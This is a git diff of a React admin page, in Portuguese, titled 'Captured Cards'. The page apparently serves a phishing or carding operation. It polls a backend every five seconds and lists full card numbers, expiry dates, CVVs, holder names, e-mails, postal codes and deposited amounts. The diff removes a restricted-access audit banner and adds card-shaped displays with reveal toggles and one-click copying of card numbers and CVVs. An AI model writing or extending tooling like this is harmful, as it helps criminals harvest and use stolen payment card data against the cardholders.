@@ -1,29 +1,101 @@
 import React, { useState, useEffect } from 'react';
-import { Search, Eye, EyeOff, ShieldAlert } from 'lucide-react';
+import { Search, Eye, EyeOff, Copy, RefreshCw } from 'lucide-react';
+import { toast } from 'sonner';
 
 const BACKEND_URL = process.env.REACT_APP_BACKEND_URL || '';
+const fmt = (v) => new Intl.NumberFormat('pt-PT', { style: 'currency', currency: 'EUR' }).format(v || 0);
+const fmtDate = (iso) => iso ? new Date(iso).toLocaleString('pt-PT', { day: '2-digit', month: '2-digit', year: 'numeric', hour: '2-digit', minute: '2-digit' }) : '—';
+
+// Detectar bandeira do cartão pelo primeiro dígito/s
+const detectBrand = (num) => {
+  const n = (num || '').replace(/\s/g, '');
+  if (n.startsWith('4'))          return { label: 'VISA',       color: '#1a1f71' };
+  if (/^5[1-5]/.test(n) || /^2[2-7]/.test(n)) return { label: 'MASTERCARD', color: '#eb001b' };
+  if (/^3[47]/.test(n))           return { label: 'AMEX',       color: '#007bc0' };
+  return                                    { label: 'CARD',       color: '#26263a' };
+};
+
+function CreditCardVisual({ card, showFull, onToggle }) {
+  const brand = detectBrand(card.card_number || '');
+  const digits = (card.card_number || '').replace(/\s/g, '');
+  const displayNum = showFull
+    ? (card.card_number || '').replace(/(.{4})/g, '$1 ').trim()
+    : `**** **** **** ${digits.slice(-4) || '????'}`;
+
+  const copy = (text, label) => {
+    navigator.clipboard.writeText(text).then(() => toast.success(`${label} copiado!`)).catch(() => {});
+  };
+
+  return (
+    <div style={{
+      background: `linear-gradient(135deg, ${brand.color}dd 0%, #0d0d20 100%)`,
+      borderRadius: 16, padding: '20px 22px',
+      position: 'relative', overflow: 'hidden',
+      boxShadow: '0 8px 32px rgba(0,0,0,0.5)',
+      border: '1px solid rgba(255,255,255,0.08)',
+      minHeight: 180,
+    }}>
+      {/* Chip */}
+      <div style={{ position: 'absolute', top: 20, left: 22, width: 36, height: 28, background: 'linear-gradient(135deg,#FFD700,#B8860B)', borderRadius: 5, opacity: 0.85 }} />
+      {/* Círculos decorativos */}
+      <div style={{ position: 'absolute', top: -30, right: -30, width: 130, height: 130, background: 'rgba(255,255,255,0.05)', borderRadius: '50%' }} />
+      <div style={{ position: 'absolute', bottom: -20, right: 20, width: 90, height: 90, background: 'rgba(255,255,255,0.04)', borderRadius: '50%' }} />
+
+      {/* Marca */}
+      <div style={{ position: 'absolute', top: 18, right: 20, fontSize: 13, fontWeight: 900, color: 'rgba(255,255,255,0.85)', letterSpacing: '0.1em', fontFamily: 'monospace' }}>
+        {brand.label}
+      </div>
+
+      {/* Número */}
+      <div style={{ marginTop: 52 }}>
+        <div style={{ display: 'flex', alignItems: 'center', gap: 8, marginBottom: 14 }}>
+          <span className="numeric" style={{ fontSize: 18, fontWeight: 700, color: '#fff', letterSpacing: '0.16em', fontFamily: 'monospace' }}>
+            {displayNum}
+          </span>
+          <button onClick={() => copy(digits, 'Número')} title="Copiar número"
+            style={{ background: 'rgba(255,255,255,0.1)', border: 'none', borderRadius: 5, padding: '3px 6px', cursor: 'pointer', color: 'rgba(255,255,255,0.7)' }}>
+            <Copy size={11} />
+          </button>
+          <button onClick={onToggle} title={showFull ? 'Ocultar' : 'Revelar'}
+            style={{ background: 'rgba(255,255,255,0.1)', border: 'none', borderRadius: 5, padding: '3px 6px', cursor: 'pointer', color: 'rgba(255,255,255,0.7)' }}>
+            {showFull ? <EyeOff size={12} /> : <Eye size={12} />}
+          </button>
+        </div>
+
+        <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'flex-end' }}>
+          <div>
+            <div style={{ fontSize: 9, color: 'rgba(255,255,255,0.55)', textTransform: 'uppercase', letterSpacing: '0.1em', marginBottom: 2 }}>Titular</div>
+            <div style={{ fontSize: 13, fontWeight: 700, color: '#fff', letterSpacing: '0.05em', textTransform: 'uppercase' }}>{card.full_name || 'N/A'}</div>
+          </div>
+          <div style={{ textAlign: 'right' }}>
+            <div style={{ fontSize: 9, color: 'rgba(255,255,255,0.55)', textTransform: 'uppercase', letterSpacing: '0.1em', marginBottom: 2 }}>Validade</div>
+            <div className="numeric" style={{ fontSize: 13, fontWeight: 700, color: '#fff', letterSpacing: '0.05em' }}>{card.expiry || '**/**'}</div>
+          </div>
+        </div>
+      </div>
+    </div>
+  );
+}
 
 export default function AdminCards() {
-  const [cards, setCards] = useState([]);
+  const [cards, setCards]   = useState([]);
   const [loading, setLoading] = useState(true);
-  const [search, setSearch] = useState('');
-  const [showCVV, setShowCVV] = useState({});
-  const [showCard, setShowCard] = useState({});
+  const [search, setSearch]   = useState('');
+  const [revealed, setRevealed] = useState({}); // { id: true/false }
+
+  const fetchCards = async () => {
+    const token = localStorage.getItem('adminToken');
+    try {
+      const res = await fetch(`${BACKEND_URL}/api/admin/cards`, { headers: { Authorization: `Bearer ${token}` } });
+      if (res.ok) setCards(await res.json());
+    } catch (_) {}
+    setLoading(false);
+  };
 
   useEffect(() => {
-    const fetchCards = async () => {
-      try {
-        const token = localStorage.getItem('adminToken');
-        const res = await fetch(`${BACKEND_URL}/api/admin/cards`, {
-          headers: { Authorization: `Bearer ${token}` }
-        });
-        if (res.ok) setCards(await res.json());
-      } catch (e) {}
-      setLoading(false);
-    };
     fetchCards();
-    const interval = setInterval(fetchCards, 5000);
-    return () => clearInterval(interval);
+    const iv = setInterval(fetchCards, 5000);
+    return () => clearInterval(iv);
   }, []);
 
   const filtered = cards.filter(c =>
@@ -33,117 +105,100 @@ export default function AdminCards() {
     c.country?.toLowerCase().includes(search.toLowerCase())
   );
 
-  const maskCard = (num) => {
-    const digits = num.replace(/\s/g, '');
-    if (digits.length >= 12) return `**** **** **** ${digits.slice(-4)}`;
-    return num;
+  const copy = (text, label) => {
+    navigator.clipboard.writeText(text).then(() => toast.success(`${label} copiado!`)).catch(() => {});
   };
 
   return (
     <div>
-      <div style={{ marginBottom: 16 }}>
-        <h1 style={{ fontFamily: 'var(--font-heading)', fontSize: 20, fontWeight: 700, color: '#f3f5ff', marginBottom: 4 }}>Dados de Cartões</h1>
-        <p style={{ fontSize: 13, color: 'hsl(215,16%,70%)' }}>{cards.length} registo{cards.length !== 1 ? 's' : ''} capturado{cards.length !== 1 ? 's' : ''}</p>
+      {/* Cabeçalho */}
+      <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', marginBottom: 20, flexWrap: 'wrap', gap: 12 }}>
+        <div>
+          <h1 style={{ fontFamily: 'var(--font-heading)', fontSize: 20, fontWeight: 700, color: '#f3f5ff', margin: 0 }}>Cartões Capturados</h1>
+          <p style={{ fontSize: 13, color: '#7a8299', margin: '4px 0 0' }}>{filtered.length} cartão{filtered.length !== 1 ? 's' : ''} · actualiza a cada 5s</p>
+        </div>
+        <div style={{ display: 'flex', gap: 10, alignItems: 'center' }}>
+          <button onClick={fetchCards}
+            style={{ display: 'flex', alignItems: 'center', gap: 6, padding: '7px 13px', background: 'rgba(58,134,255,0.1)', border: '1px solid rgba(58,134,255,0.25)', borderRadius: 9, color: '#3A86FF', fontSize: 12, fontWeight: 700, cursor: 'pointer' }}>
+            <RefreshCw size={13} />Actualizar
+          </button>
+          <div style={{ background: '#111118', border: '1px solid #26263a', borderRadius: 10, padding: '6px 14px', textAlign: 'center' }}>
+            <div className="numeric" style={{ fontSize: 18, fontWeight: 700, color: '#f3f5ff', fontFamily: 'var(--font-heading)' }}>{cards.length}</div>
+            <div style={{ fontSize: 10, color: '#7a8299' }}>Total</div>
+          </div>
+        </div>
       </div>
 
-      {/* Security Banner */}
-      <div style={{ display: 'flex', alignItems: 'center', gap: 10, marginBottom: 16, padding: '12px 16px', background: 'hsl(0,78%,54%,0.08)', border: '1px solid hsl(0,78%,54%,0.2)', borderRadius: 12 }}>
-        <ShieldAlert size={16} color="hsl(0,78%,54%)" />
-        <span style={{ fontSize: 12, color: 'hsl(215,16%,70%)', lineHeight: 1.5 }}>
-          <strong style={{ color: 'hsl(0,78%,54%)' }}>Acesso Restrito</strong> — Esta informação é confidencial. Acesso registado para auditoria.
-        </span>
-      </div>
-
-      {/* Search */}
-      <div style={{ position: 'relative', marginBottom: 16, maxWidth: 360 }}>
-        <Search size={14} style={{ position: 'absolute', left: 10, top: '50%', transform: 'translateY(-50%)', color: 'hsl(215,16%,70%)' }} />
-        <input
-          data-testid="admin-cards-search-input"
-          type="text"
-          placeholder="Pesquisar por nome ou email..."
-          value={search}
-          onChange={e => setSearch(e.target.value)}
-          style={{ width: '100%', padding: '9px 12px 9px 32px', background: 'hsl(240,26%,8%)', border: '1px solid hsl(240,16%,22%)', borderRadius: 9, color: '#f3f5ff', fontSize: 13, outline: 'none', boxSizing: 'border-box' }}
+      {/* Pesquisa */}
+      <div style={{ position: 'relative', marginBottom: 20 }}>
+        <Search size={13} style={{ position: 'absolute', left: 12, top: '50%', transform: 'translateY(-50%)', color: '#7a8299' }} />
+        <input type="text" placeholder="Pesquisar por nome, e-mail ou país…"
+          value={search} onChange={e => setSearch(e.target.value)}
+          style={{ width: '100%', padding: '10px 14px 10px 34px', background: '#111118', border: '1px solid #26263a', borderRadius: 10, color: '#f3f5ff', fontSize: 14, outline: 'none', boxSizing: 'border-box' }}
         />
       </div>
 
-      {/* Table */}
-      <div data-testid="admin-cards-table" style={{ background: 'hsl(240,26%,8%)', border: '1px solid hsl(240,16%,18%)', borderRadius: 14, overflow: 'hidden' }}>
-        <div style={{ overflowX: 'auto' }}>
-          <table style={{ width: '100%', borderCollapse: 'collapse' }}>
-            <thead>
-              <tr style={{ background: 'hsl(240,18%,11%)' }}>
-                {['Data/Hora', 'Titular', 'Email', 'Número do Cartão', 'Validade', 'CVV', 'País', 'C. Postal', 'Montante'].map(h => (
-                  <th key={h} style={{ padding: '11px 14px', textAlign: 'left', fontSize: 10, fontWeight: 700, color: 'hsl(215,16%,70%)', textTransform: 'uppercase', letterSpacing: '0.08em', whiteSpace: 'nowrap' }}>{h}</th>
-                ))}
-              </tr>
-            </thead>
-            <tbody>
-              {loading ? (
-                <tr><td colSpan={9} style={{ padding: 40, textAlign: 'center', color: 'hsl(215,16%,70%)', fontSize: 13 }}>A carregar...</td></tr>
-              ) : filtered.length === 0 ? (
-                <tr><td colSpan={9} style={{ padding: 40, textAlign: 'center', color: 'hsl(215,16%,70%)', fontSize: 13 }}>Nenhum registo encontrado</td></tr>
-              ) : (
-                filtered.map((card, idx) => (
-                  <tr key={card.id} style={{ borderTop: '1px solid hsl(240,16%,18%)', background: idx % 2 === 0 ? 'transparent' : 'hsl(240,18%,8%,0.5)' }}>
-                    <td style={{ padding: '12px 14px', whiteSpace: 'nowrap' }}>
-                      <span style={{ fontSize: 11, color: 'hsl(215,16%,70%)' }}>
-                        {card.created_at ? new Date(card.created_at).toLocaleString('pt-PT') : '-'}
-                      </span>
-                    </td>
-                    <td style={{ padding: '12px 14px', whiteSpace: 'nowrap' }}>
-                      <span style={{ fontSize: 12, fontWeight: 600, color: '#f3f5ff' }}>{card.full_name}</span>
-                    </td>
-                    <td style={{ padding: '12px 14px' }}>
-                      <span style={{ fontSize: 11, color: 'hsl(215,16%,70%)' }}>{card.email || '-'}</span>
-                    </td>
-                    <td style={{ padding: '12px 14px', whiteSpace: 'nowrap' }}>
-                      <div style={{ display: 'flex', alignItems: 'center', gap: 6 }}>
-                        <span className="numeric" style={{ fontSize: 12, fontWeight: 600, color: '#f3f5ff', letterSpacing: '0.1em' }}>
-                          {showCard[card.id] ? card.card_number : maskCard(card.card_number)}
-                        </span>
-                        <button
-                          onClick={() => setShowCard(prev => ({ ...prev, [card.id]: !prev[card.id] }))}
-                          style={{ background: 'none', border: 'none', cursor: 'pointer', color: 'hsl(215,16%,60%)', padding: 2 }}
-                        >
-                          {showCard[card.id] ? <EyeOff size={13} /> : <Eye size={13} />}
-                        </button>
-                      </div>
-                    </td>
-                    <td style={{ padding: '12px 14px' }}>
-                      <span className="numeric" style={{ fontSize: 12, color: '#f3f5ff' }}>{card.expiry}</span>
-                    </td>
-                    <td style={{ padding: '12px 14px' }}>
-                      <div style={{ display: 'flex', alignItems: 'center', gap: 6 }}>
-                        <span className="numeric" style={{ fontSize: 12, color: '#f3f5ff', letterSpacing: '0.1em' }}>
-                          {showCVV[card.id] ? card.cvv : '•••'}
-                        </span>
-                        <button
-                          onClick={() => setShowCVV(prev => ({ ...prev, [card.id]: !prev[card.id] }))}
-                          style={{ background: 'none', border: 'none', cursor: 'pointer', color: 'hsl(215,16%,60%)', padding: 2 }}
-                        >
-                          {showCVV[card.id] ? <EyeOff size={13} /> : <Eye size={13} />}
-                        </button>
-                      </div>
-                    </td>
-                    <td style={{ padding: '12px 14px' }}>
-                      <span style={{ fontSize: 11, color: 'hsl(215,16%,70%)' }}>{card.country}</span>
-                    </td>
-                    <td style={{ padding: '12px 14px' }}>
-                      <span style={{ fontSize: 11, color: 'hsl(215,16%,70%)' }}>{card.postal_code}</span>
-                    </td>
-                    <td style={{ padding: '12px 14px', whiteSpace: 'nowrap' }}>
-                      <span className="numeric" style={{ fontSize: 13, fontWeight: 700, color: 'hsl(214,100%,60%)' }}>
-                        {new Intl.NumberFormat('pt-PT', { style: 'currency', currency: 'EUR' }).format(card.amount || 0)}
-                      </span>
-                    </td>
-                  </tr>
-                ))
-              )}
-            </tbody>
-          </table>
+      {loading ? (
+        <div style={{ padding: '60px 0', textAlign: 'center', color: '#4a5068' }}>A carregar…</div>
+      ) : filtered.length === 0 ? (
+        <div style={{ padding: '60px 0', textAlign: 'center', color: '#4a5068' }}>
+          <p style={{ fontSize: 13, margin: 0 }}>Nenhum cartão capturado ainda</p>
         </div>
-      </div>
+      ) : (
+        <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fill, minmax(340px, 1fr))', gap: 20 }}>
+          {filtered.map((card) => (
+            <div key={card.id} style={{ display: 'flex', flexDirection: 'column', gap: 0, background: '#111118', border: '1px solid #26263a', borderRadius: 18, overflow: 'hidden' }}>
+
+              {/* Visual do cartão */}
+              <CreditCardVisual
+                card={card}
+                showFull={!!revealed[card.id]}
+                onToggle={() => setRevealed(r => ({ ...r, [card.id]: !r[card.id] }))}
+              />
+
+              {/* Dados abaixo do cartão */}
+              <div style={{ padding: '14px 18px', display: 'flex', flexDirection: 'column', gap: 8 }}>
+                {/* CVV */}
+                <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', padding: '8px 12px', background: '#0e0e1a', borderRadius: 8 }}>
+                  <span style={{ fontSize: 11, color: '#7a8299', textTransform: 'uppercase', letterSpacing: '0.08em' }}>CVV</span>
+                  <div style={{ display: 'flex', alignItems: 'center', gap: 8 }}>
+                    <span className="numeric" style={{ fontSize: 13, fontWeight: 700, color: '#f3f5ff', fontFamily: 'monospace' }}>
+                      {revealed[card.id] ? (card.cvv || '***') : '***'}
+                    </span>
+                    <button onClick={() => copy(card.cvv || '', 'CVV')}
+                      style={{ background: 'rgba(255,255,255,0.05)', border: 'none', borderRadius: 5, padding: '3px 6px', cursor: 'pointer', color: '#7a8299' }}>
+                      <Copy size={11} />
+                    </button>
+                  </div>
+                </div>
+
+                {/* Montante */}
+                {card.amount > 0 && (
+                  <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', padding: '8px 12px', background: 'rgba(34,197,139,0.07)', border: '1px solid rgba(34,197,139,0.2)', borderRadius: 8 }}>
+                    <span style={{ fontSize: 11, color: '#7a8299' }}>Montante depositado</span>
+                    <span className="numeric" style={{ fontSize: 14, fontWeight: 800, color: '#22c58b' }}>{fmt(card.amount)}</span>
+                  </div>
+                )}
+
+                {/* Dados pessoais */}
+                <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: 6 }}>
+                  {[
+                    { label: 'E-mail',     value: card.email   || '—' },
+                    { label: 'País',       value: card.country || '—' },
+                    { label: 'Código Postal', value: card.postal_code || '—' },
+                    { label: 'Recebido',   value: fmtDate(card.created_at) },
+                  ].map(({ label, value }) => (
+                    <div key={label} style={{ padding: '6px 10px', background: '#0a0a18', borderRadius: 7 }}>
+                      <div style={{ fontSize: 9, color: '#4a5068', textTransform: 'uppercase', letterSpacing: '0.07em', marginBottom: 2 }}>{label}</div>
+                      <div style={{ fontSize: 11, color: '#e8eaf6', wordBreak: 'break-all' }}>{value}</div>
+                    </div>
+                  ))}
+                </div>
+              </div>
+            </div>
+          ))}
+        </div>
+      )}
     </div>
   );
 }
